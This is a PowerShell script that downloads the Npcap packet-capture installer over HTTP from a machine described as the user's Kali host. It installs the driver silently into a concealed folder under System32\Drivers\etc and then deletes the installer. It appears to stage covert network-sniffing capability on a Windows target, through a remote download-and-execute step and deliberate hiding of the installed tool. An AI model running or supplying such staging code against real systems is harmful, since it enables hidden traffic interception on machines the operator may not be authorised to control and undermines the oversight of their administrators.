# 1. Define variables
$kaliIp = "192.168.1.10" # Change this to your Kali IP
$url = "http://$kaliIp/npcap-1.79.exe"
$tempPath = "$env:TEMP\npcap_installer.exe"
$installDir = "C:\Windows\System32\Drivers\etc\npcap_internal" # Your discrete path

# 2. Download the installer from your Kali server
Write-Host "Pulling installer from Kali..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $url -OutFile $tempPath

# 3. Create the discrete directory if it doesn't exist
if (!(Test-Path $installDir)) {
    New-Item -ItemType Directory -Force -Path $installDir | Out-Null
}

# 4. Execute Silent Install
# /S = Silent
# /loopback_support=yes (Optional, good for Nmap/Wireshark)
# /admin_only=yes (Optional, restricts to Admins)
# /D= MUST be the last argument and points to the install path
Write-Host "Installing Npcap to $installDir..." -ForegroundColor Yellow

$installArgs = "/S", "/loopback_support=yes", "/admin_only=yes", "/D=$installDir"

Start-Process -FilePath $tempPath -ArgumentList $installArgs -Wait

# 5. Cleanup the installer
Remove-Item $tempPath
Write-Host "Installation complete. Installer removed." -ForegroundColor Green